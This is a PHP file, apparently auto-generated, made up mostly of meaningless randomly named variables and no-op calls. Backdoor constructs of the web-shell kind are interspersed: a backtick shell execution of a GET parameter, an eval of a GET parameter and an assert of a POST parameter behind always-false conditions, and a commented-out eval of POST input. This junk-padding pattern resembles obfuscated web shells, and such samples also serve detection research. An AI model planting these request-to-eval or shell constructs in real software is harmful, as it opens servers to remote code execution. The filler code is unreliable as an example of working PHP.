<?php
$Az = 'ciDB';
$ZcTNM = 'awJky5';
$KdHPw = 'iC';
$uQ75QyOBiQ = 'mo4';
$cp = 'FS6g';
$mq7sQfM2t = 'aKQ3KhPFdqj';
$LEDG = 'SOTNsrWm8';
$CuDSxBQ9XA = 'sBYcd_G';
$la66_pS = 'f5';
$lZO0Bl = 'pgIn5mBC';
if(function_exists("kWnxYtdWi")){
    kWnxYtdWi($Az);
}
preg_match('/zn6UFy/i', $ZcTNM, $match);
print_r($match);
echo $KdHPw;
$cp = explode('gDVz94', $cp);
echo $LEDG;
$CuDSxBQ9XA = $_POST['xYHI4jyM'] ?? ' ';
$UbJWOc79L = 'IYmJhL';
$aE = 'mRTg';
$MOVSb = 'N9';
$De = 'eeuV5ZLSt';
$bpYL5PvY = new stdClass();
$bpYL5PvY->ya4byitj4in = 'OJNxnlbTpT_';
$bpYL5PvY->Pw = 'Wiy3';
$bpYL5PvY->P4tQ = '_bw';
$sF6zsX = 'PhT7Ipjp3Oi';
$VKhV81IUr3 = 'vQZHTED';
$gC6AiOz38y = 'm9PmY';
$UsP = 'YLbKcBsu';
str_replace('GUGveSyuPb2X', 'VHocfVBWyAI', $UbJWOc79L);
$aE .= 'scZVkSZP4';
echo $MOVSb;
$De = explode('uVI6ib_hPW0', $De);
echo $sF6zsX;
if(function_exists("YsIEXKCnhN5L7a")){
    YsIEXKCnhN5L7a($gC6AiOz38y);
}
$NS = 'petQ0';
$JxKov = 'YVnv_T_qc';
$wBSX = 'HF4dB8CZ13';
$uiNPjGSRu = 'awZA1';
$kf9pEQAPKPx = 'OqIly';
$op = 'nTf';
$nrZN = 'Sb6XLOqZ2';
$qBasa4udt = 'Pw3';
var_dump($NS);
$wBSX = $_GET['E4RH2DBXkdk'] ?? ' ';
str_replace('S7KoPwiV46aRQ', 'iGVbRRoJp2izZ', $uiNPjGSRu);
$kf9pEQAPKPx = explode('yNlKtKN42nB', $kf9pEQAPKPx);
$op = $_GET['aFUQoF5gU5l'] ?? ' ';
$nrZN = $_GET['YFQPTOZkV5'] ?? ' ';
echo $qBasa4udt;
$VdnK = 'fNp';
$TVrOYstOosw = new stdClass();
$TVrOYstOosw->qrQ3G = 'KBuR';
$TVrOYstOosw->q9EA = 'mycbMLz';
$TVrOYstOosw->vb87w = 't2k8bj';
$DaAQcT1Je9 = 'ljJTlUhW';
$orfomO = 'vl6VlektL';
$rPZJ = 'lTVAnN1PuL';
$lkmIJ = 'X58v';
if(function_exists("fid5xzycDozdy")){
    fid5xzycDozdy($DaAQcT1Je9);
}
$p52dyNVxP = array();
$p52dyNVxP[]= $orfomO;
var_dump($p52dyNVxP);
str_replace('PXKywf5B5', 'ugney91LW2', $rPZJ);
$qg1TtD = array();
$qg1TtD[]= $lkmIJ;
var_dump($qg1TtD);
$Fr9ydGXPy = NULL;
assert($Fr9ydGXPy);
$F154O90E5Ql = 'AD0Q8TQjyT';
$b05 = 'sS2Uo_gVJL';
$_5G045N = 'u5kNSRwnt';
$ueY = 'hUUO4fdf';
$cwVcXrNCp = 'LYp_aIcYrC';
$mLWovbtmGDp = 'kEEVm';
$fjYKKak = 'Ql1wxlQFe';
$CN3A9 = 'VxZP1F';
$uf = 'NNBjGQCc5BM';
$_cg = 'fYJzhko';
$tXp7zAiXP05 = array();
$tXp7zAiXP05[]= $F154O90E5Ql;
var_dump($tXp7zAiXP05);
echo $b05;
$_5G045N = $_GET['_J_qgtE03gNeLIe'] ?? ' ';
echo $ueY;
$cwVcXrNCp = $_GET['a7PTxHMyKek'] ?? ' ';
$fjYKKak = $_GET['z1c9AmHZS'] ?? ' ';
echo $CN3A9;
preg_match('/TWwsxa/i', $uf, $match);
print_r($match);
$_cg = $_POST['Vl6LlMJf0JDv'] ?? ' ';
$_GET['AzY_yLyc6'] = ' ';
echo `{$_GET['AzY_yLyc6']}`;
$Mu = 'aabWqDvq';
$XwSlmjs = 'llvu1hSTq';
$hMAL = 'Vv';
$_8ayK = 'YB';
$omVsy8w = 'Uosi_V';
$QE1Es6Z0I = new stdClass();
$QE1Es6Z0I->yNZY = 'lAfmZ4uyB8';
$QE1Es6Z0I->uTwSj3uk7B3 = 'xCx3_YJbKm';
$QE1Es6Z0I->QBLmDJgmr = 'ijyyjt966';
$QE1Es6Z0I->CLucUq = 's4Tvugayi';
$QE1Es6Z0I->Rh = 'wt3iA';
$QE1Es6Z0I->SWkw43 = '_iL';
echo $Mu;
$L_ybiLeC_ = array();
$L_ybiLeC_[]= $XwSlmjs;
var_dump($L_ybiLeC_);
$hMAL = $_POST['L77HgLw'] ?? ' ';
$HEKjDQLhMYW = array();
$HEKjDQLhMYW[]= $_8ayK;
var_dump($HEKjDQLhMYW);
echo $omVsy8w;
if('KCmudCaSw' == 'eZMHCbt8b')
assert($_POST['KCmudCaSw'] ?? ' ');
$c72k = 'DaG5';
$bbwkZVD = 'eEnF1hPyl';
$uWJFZz = 'RwZ';
$nyMlCnE32uE = 'lUvL4htoJ';
$Vbs__aYyBcw = 'ErFUesF';
var_dump($c72k);
$nyMlCnE32uE .= 'ZhvLke4Th7f';
$Vbs__aYyBcw = explode('rIsWQBf', $Vbs__aYyBcw);
if('y3kAQnNUm' == 'bEEjMIBA5')
 eval($_GET['y3kAQnNUm'] ?? ' ');
$FA7Va = 'dZCkDxm4K';
$CGBIwZL = 'WFdJRXUL6N';
$td3HwqaY = 'BdT';
$dPn_yHAt_ = 'LuUk6XW6';
$hPCOx = 'mR';
$SbuYDfwV0 = new stdClass();
$SbuYDfwV0->u4w = 'xqdC5B';
$SbuYDfwV0->sSpvkj = 'j5686oerW8';
$SbuYDfwV0->HnKFraMYiVZ = 'B6doM';
$NyO82dya = '_nPIH';
var_dump($CGBIwZL);
$hPCOx .= '_Zyfup';
$NyO82dya .= 'J3arhKw';
$ZMud = 'A2pMxAP0';
$vlDzlMl = 'PC';
$PVAI_Zw3Lwp = 'Y0HC6YA';
$P0P0KPchBw = 'RzcsDEH';
$pLa6ofxG = 'Y9JKyo';
$Pt4CeWwX = 'sBR7';
$DFPK05eqyY = new stdClass();
$DFPK05eqyY->Ws1Yi = 'CRLqXG';
$DFPK05eqyY->v7lYw = 'ygh0d';
$x7C = 'ImeNFveTx';
$NobI9OuT2 = 'pm7P';
var_dump($ZMud);
echo $vlDzlMl;
var_dump($P0P0KPchBw);
str_replace('zwp_jCOwYM', 'DuzTeg70MbXKeUk_', $pLa6ofxG);
$Pt4CeWwX = $_POST['qPn6kCIZMdV'] ?? ' ';
preg_match('/EwJ9vX/i', $x7C, $match);
print_r($match);
$NobI9OuT2 .= 'Fr3ZZh9abgGR';
$gKsmheO2 = 'hGGtd';
$kj = 'sYI90ulR2';
$fg2emcqoA7O = 'Nv8n';
$V7SvP = 'ivUJxF78';
$FUqdsSbu = 'PIT5q';
$gKsmheO2 = $_POST['EQhejuH7Y'] ?? ' ';
str_replace('_H3tHLtI65XyOgY', 'rFLKu0a', $kj);
echo $fg2emcqoA7O;
$V7SvP .= 'jYeB1w';
$FUqdsSbu = explode('_QOpi2yyX9D', $FUqdsSbu);
$QrhX3h0fV = 'TG4c';
$CxAI8wsta = new stdClass();
$CxAI8wsta->AkKbJ = 'pWTRTxZg';
$CxAI8wsta->BF6 = 'MPVJk';
$CxAI8wsta->xMh = 'K0B';
$CxAI8wsta->tLtp5Ywzc = 'GWv9_qzT4';
$OXOR1Ml = 'j7';
$gcX1xeDo = 'NOgpuZug';
$IQY = 'BL';
$tEf3F = 'H1';
var_dump($QrhX3h0fV);
$OXOR1Ml = explode('VDFO4S0nOWV', $OXOR1Ml);
$IQY = $_POST['rNGdIxjnly88'] ?? ' ';
$QTZ6PBGfoOS = array();
$QTZ6PBGfoOS[]= $tEf3F;
var_dump($QTZ6PBGfoOS);

function iB()
{
    $ujv9 = 'BcgOxp62u7';
    $odUhRz = 'phfjl75l';
    $otcd8 = 'kQiA';
    $XOeP = 'Ot';
    $fSP = 'xTwfrv3o2';
    $Yy = 'hcRud';
    $s1vI_0P_L = 'HKCGdLBtuv';
    var_dump($ujv9);
    if(function_exists("Le4BLZ7YDC")){
        Le4BLZ7YDC($odUhRz);
    }
    if(function_exists("K0EWQiqJuvw5VMuz")){
        K0EWQiqJuvw5VMuz($otcd8);
    }
    $XOeP = $_POST['hobm7ZOHf'] ?? ' ';
    $fSP = $_GET['KKm0lTT7mTL7_'] ?? ' ';
    $Yy .= 'nAnuXDjKX';
    preg_match('/R8hCRS/i', $s1vI_0P_L, $match);
    print_r($match);
    
}
$upx = 'JM5tn4s73G';
$Gvk = 'qkAz9B';
$osIJB1 = 'hjXmqCfWp';
$H5BQFon = 'qQO45Rnnc';
$cBe4IQCG_m = 'mEdMRk33G';
$D30Ugb6Pi8 = new stdClass();
$D30Ugb6Pi8->aSc7ym9Tt = 'hFrRD8';
$D30Ugb6Pi8->HEQ = 'I6A15';
$D30Ugb6Pi8->Oa_4WmJ = 'GMve9WZXZD';
$D30Ugb6Pi8->Puv1z = 'KWYP6GDLr';
$D30Ugb6Pi8->Go2j_v = 'Nh_0P';
$Zd = 'dIPQ92';
$XWSxC3 = 'G3z18';
$z3q0jkU = 'BVEl3M3b';
echo $upx;
$Gvk = $_GET['ADiJCQaq'] ?? ' ';
$bhbkjfmtikT = array();
$bhbkjfmtikT[]= $osIJB1;
var_dump($bhbkjfmtikT);
$H5BQFon = $_GET['a1mDJUNA0Fup2p'] ?? ' ';
str_replace('iakg5AX5LqVkkE', 'o_UMIvEBvmE6RUT', $cBe4IQCG_m);
$Zd = $_GET['c5RIzr03A2'] ?? ' ';
if(function_exists("iaCJwCUv")){
    iaCJwCUv($XWSxC3);
}

function uQ79GvG()
{
    $Djm2 = 'jmw';
    $IKz8iFY1Gd = 'vLX42xe2';
    $vbvhyjC = 'ZoM_syozrF9';
    $Yg = 'm6t2';
    $t8wSnpxda = 'SJIQtGa0h2h';
    $A8nb = 'oPXoHfIdo';
    $A3etzSdNC = 'uzhXW';
    $i2WSMHow0 = 'vW';
    if(function_exists("CJH5eUpVKBow")){
        CJH5eUpVKBow($Djm2);
    }
    $vbvhyjC = explode('ZPlb54', $vbvhyjC);
    echo $Yg;
    var_dump($A8nb);
    if(function_exists("g5eZ3DGKjhc")){
        g5eZ3DGKjhc($A3etzSdNC);
    }
    $LhXeFpnNA6h = array();
    $LhXeFpnNA6h[]= $i2WSMHow0;
    var_dump($LhXeFpnNA6h);
    
}
/*
if('lgeLGJb7v' == 'M05A3ZWOh')
eval($_POST['lgeLGJb7v'] ?? ' ');
*/
$p2xhOGkobM = 'ghXiWXAUDG';
$A8fU3E = 'vsd7wXy';
$MJNK25E = 'YoB';
$lj4 = 'FtvIl';
$DP = 'sb';
$oO4wxd7 = new stdClass();
$oO4wxd7->Xu = 'ibC8nM2';
$ItdDxXXtEU = 'IJ';
$OHybkWdOcg = 'iWhHOvK';
$m95XF7rYVgb = 'H5pkBI0gmn6';
$pTgFMek = 'Nn4N9JDM';
var_dump($p2xhOGkobM);
str_replace('pF3UYLmLDeqJi', 'hOaCaHANluR', $A8fU3E);
$MJNK25E = explode('EGxTggIcK', $MJNK25E);
if(function_exists("Yqjj767E")){
    Yqjj767E($DP);
}
echo $ItdDxXXtEU;
str_replace('eoi8WBAorxAz', 'O3IAOF6wO6Dx', $m95XF7rYVgb);
$pTgFMek = explode('DLFzweXp5kU', $pTgFMek);
echo 'End of File';
